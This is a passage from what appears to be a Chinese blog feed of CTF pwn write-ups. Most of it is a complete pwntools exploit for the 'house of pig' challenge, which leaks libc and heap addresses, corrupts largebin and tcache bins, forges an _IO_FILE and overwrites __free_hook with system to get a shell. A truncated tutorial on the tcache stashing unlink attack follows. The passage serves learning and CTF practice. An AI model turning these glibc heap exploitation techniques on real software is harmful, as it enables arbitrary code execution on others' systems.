(fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><p>可以看到这里的old_buf也就是fp-&gt;_IO_buf_base然后old_blen也可以看到上面的定义，所以我们需要构造两个差值为0x18，并且我们可以看到，我们复制的内容也是从old_buf开始的，然后我们分配的tcahce其实是需要写三个p64才能修改到free_hook。</p><p><img src="/images/image-20220301113121625.png" alt="image-20220301113121625"></p><p>我们这里的思路其实就是修改free_hook为system，那么我们free的时候就需要参数为<code>/bin/sh</code>所以我们old_buf就这样确定了，所以在构造结构体时后面跟了两个p64(system)这里和前面的不一样。</p><h3 id="所以综上得出，exp"><a href="#所以综上得出，exp" class="headerlink" title="所以综上得出，exp"></a>所以综上得出，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">struct pig&#123;</span></span><br><span class="line"><span class="string">    chunk_arr[24];</span></span><br><span class="line"><span class="string">    chunk_size[24];</span></span><br><span class="line"><span class="string">    chunk_exist[24];</span></span><br><span class="line"><span class="string">    chunk_freed[24];</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">struct all_pig&#123;</span></span><br><span class="line"><span class="string">    Peppa_chunk_arr[24];   size: 0xc0</span></span><br><span class="line"><span class="string">    Peppa_chunk_size[24];  size: 0x60</span></span><br><span class="line"><span class="string">    Peppa_chunk_exist[24]; size: 0x18</span></span><br><span class="line"><span class="string">    Peppa_chunk_freed[24]; size: 0x18</span></span><br><span class="line"><span class="string">    Peppa_last_chunk_size; size: 0x4</span></span><br><span class="line"><span class="string">    padding;               size: 0x4</span></span><br><span class="line"><span class="string">    Mummy_chunk_arr[24];   size: 0xc0</span></span><br><span class="line"><span class="string">    Mummy_chunk_size[24];  size: 0x60</span></span><br><span class="line"><span class="string">    Mummy_chunk_exist[24]; size: 0x18</span></span><br><span class="line"><span class="string">    Mummy_chunk_freed[24]; size: 0x18</span></span><br><span class="line"><span class="string">    Mummy_last_chunk_size; size: 0x4</span></span><br><span class="line"><span class="string">    padding;               size: 0x4</span></span><br><span class="line"><span class="string">    Daddy_chunk_arr[24];   size: 0xc0</span></span><br><span class="line"><span class="string">    Daddy_chunk_size[24];  size: 0x60</span></span><br><span class="line"><span class="string">    Daddy_chunk_exist[24]; size: 0x18</span></span><br><span class="line"><span class="string">    Daddy_chunk_freed[24]; size: 0x18</span></span><br><span class="line"><span class="string">    Daddy_last_chunk_size; size: 0x4</span></span><br><span class="line"><span class="string">    padding;               size: 0x4</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">password&#123;</span></span><br><span class="line"><span class="string">    Peppa: A\x01\x95\xc9\x1c</span></span><br><span class="line"><span class="string">    Mummy: B\x01\x87\xc3\x19</span></span><br><span class="line"><span class="string">    Daddy: C\x01\xf7\x3c\x32</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input the message size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;&#x27;s message: &quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input the message index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input the message index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;&#x27;s message: &quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input the message index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">role</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please enter the identity password of the corresponding user:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> role == <span class="number">1</span>:</span><br><span class="line">        r.sendline(<span class="string">b&#x27;A\x01\x95\xc9\x1c&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> role == <span class="number">2</span>:</span><br><span class="line">        r.sendline(<span class="string">b&#x27;B\x01\x87\xc3\x19&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendline(<span class="string">b&#x27;C\x01\xf7\x3c\x32&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A7</span></span><br><span class="line">    delete(i+<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;The message is: &#x27;</span>)</span><br><span class="line">main_arena_96 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;The message is: aaaaaaa\n&#x27;</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    create(<span class="number">0x90</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">3</span>)  <span class="comment"># B4</span></span><br><span class="line">    delete(i)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A8</span></span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A9</span></span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A10</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xb0</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">2</span>)  <span class="comment"># B5</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xb0</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">2</span>)  <span class="comment"># B6</span></span><br><span class="line">create(<span class="number">0x410</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">21</span>)  <span class="comment"># B7</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A12</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x410</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># B8</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">10</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(heap_base+<span class="number">0x12c40</span>) +</span><br><span class="line">     p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A13</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x420</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># B9</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A14</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x430</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># A15</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x28</span>))</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x430</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># A16</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x410</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">21</span>)  <span class="comment"># C0</span></span><br><span class="line"><span class="comment"># create(0x90, b&#x27;\n&#x27;*3)  # C1</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(heap_base+<span class="number">0x13680</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, p64(heap_base+<span class="number">0x13c00</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>))</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x430</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># C1</span></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># C2</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(heap_base+<span class="number">0x13680</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, p64(heap_base+<span class="number">0x13c00</span>)*<span class="number">2</span>)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(heap_base+<span class="number">0x13c00</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x158</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">0x410</span>, payload)  <span class="comment"># C3</span></span><br><span class="line">create(<span class="number">0x90</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">2</span>)  <span class="comment"># C4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span>(<span class="params">_IO_write_base=<span class="number">0</span>, _IO_write_ptr=<span class="number">0</span>, _IO_buf_base=<span class="number">0</span>, _IO_buf_end=<span class="number">0</span>, vtable=<span class="number">0</span></span>):</span></span><br><span class="line">    IO_FILE = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>) + \</span><br><span class="line">        p64(_IO_write_base)+p64(_IO_write_ptr) + \</span><br><span class="line">        p64(<span class="number">0</span>)+p64(_IO_buf_base)+p64(_IO_buf_end)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    IO_FILE += p32(<span class="number">0</span>)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(vtable)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Gift:&quot;</span>)</span><br><span class="line">_IO_str_jumps = libc_base+<span class="number">0x1ed560</span></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">file_struct = pack_file(<span class="number">1</span>, <span class="number">0xffffffffffff</span>, heap_base +</span><br><span class="line">                        <span class="number">0x13c00</span>+<span class="number">0xe0</span>, heap_base+<span class="number">0x13c00</span>+<span class="number">0xe0</span>+<span class="number">0x18</span>, _IO_str_jumps)</span><br><span class="line">file_struct += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system_addr)*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(file_struct[<span class="number">0x10</span>:])))</span><br><span class="line">r.sendline(file_struct[<span class="number">0x10</span>:])</span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="附件链接："><a href="#附件链接：" class="headerlink" title="附件链接："></a>附件链接：</h2><p><a class="link"   href="https://github.com/01dwang/house_of_pig" >https://github.com/01dwang/house_of_pig<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在最近做题的过程中发现自己的逆向能力很是欠缺，在梳理程序的逻辑的时候总是会梳理不清，尤其是程序当中存在复杂的结构体时或则存在cpp代码时，脑子就像有浆糊一样，后续会针对自己的逆向能力下手多练习相关题目。&lt;/p&gt;
&lt;h2 id=&quot;ida恢复跳表&quot;&gt;&lt;a href=&quot;#ida恢</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house系列" scheme="https://cv196082.gitee.io/tags/house%E7%B3%BB%E5%88%97/"/>
    
    <category term="house of pig" scheme="https://cv196082.gitee.io/tags/house-of-pig/"/>
    
  </entry>
  
  <entry>
    <title>tcache stashing unlink attack</title>
    <link href="https://cv196082.gitee.io/2022/02/24/tcache-stashing-unlink-attack/"/>
    <id>https://cv196082.gitee.io/2022/02/24/tcache-stashing-unlink-attack/</id>
    <published>2022-02-24T09:19:50.000Z</published>
    <updated>2022-02-28T09:10:22.803Z</updated>
    
    <content type="html"><![CDATA[<p>tcache stashing unlink attack作为house of pig的基础，所在这一篇更新完了就会跟新house of pig以及SROP。</p><p>首先，这种利用方式需要的条件就是存在calloc来申请chunk。</p><h2 id="在Glibc2-27以及到Glibc2-31下的tcache-stashing-unlink-attack"><a href="#在Glibc2-27以及到Glibc2-31下的tcache-stashing-unlink-attack" class="headerlink" title="在Glibc2.27以及到Glibc2.31下的tcache stashing unlink attack"></a>在Glibc2.27以及到Glibc2.31下的tcache stashing unlink attack</h2><p>先看一下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在源码的注释也写上了，当tcache没有满，其他bin没有空的情况下就会把其他bin当中的chunk put进tcache内，并且这一阶段是没有任何保护的。根据昨天的largebin attack可以很清楚的看出来，这两行代码是有问题的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>接下来就用heap exploit2.31当中的poc来做演示(这个poc的方式很巧妙)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span 